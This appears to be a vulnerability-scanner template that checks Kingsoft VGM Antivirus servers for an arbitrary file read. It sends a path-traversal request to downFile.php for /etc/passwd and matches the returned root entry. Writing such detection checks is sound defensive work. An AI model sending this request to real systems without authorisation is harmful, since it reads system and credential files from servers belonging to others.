id: "kingsoft-vgm-lfi"
name: "Kingsoft VGM Antivirus - Arbitrary File Read"
severity: "high"
description: "There is an arbitrary file reading vulnerability in Kingsoft Antivirus. An attacker can obtain any file on the server through the vulnerability."
tech:
  - "php"
tags:
  - "kingsoft"
  - "vgm"
  - "lfi"
  - "vuln"
reference: "https://mp.weixin.qq.com/s?__biz=MzkyMjE3MjEyNQ==&mid=2247486073&idx=1&sn=8e61e162262585bb8ce973b61df989b4&chksm=c1f925cbf68eacddfe441b8f1861e88068039712e467fb9bbe91eae31d439286c7147d197b07"
spaExclusion: true
request:
  method: "GET"
  path: "/downFile.php?filename=../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "word"
    part: "header"
    words:
      - "application/force-download"
  - type: "status"
    status:
      - 200
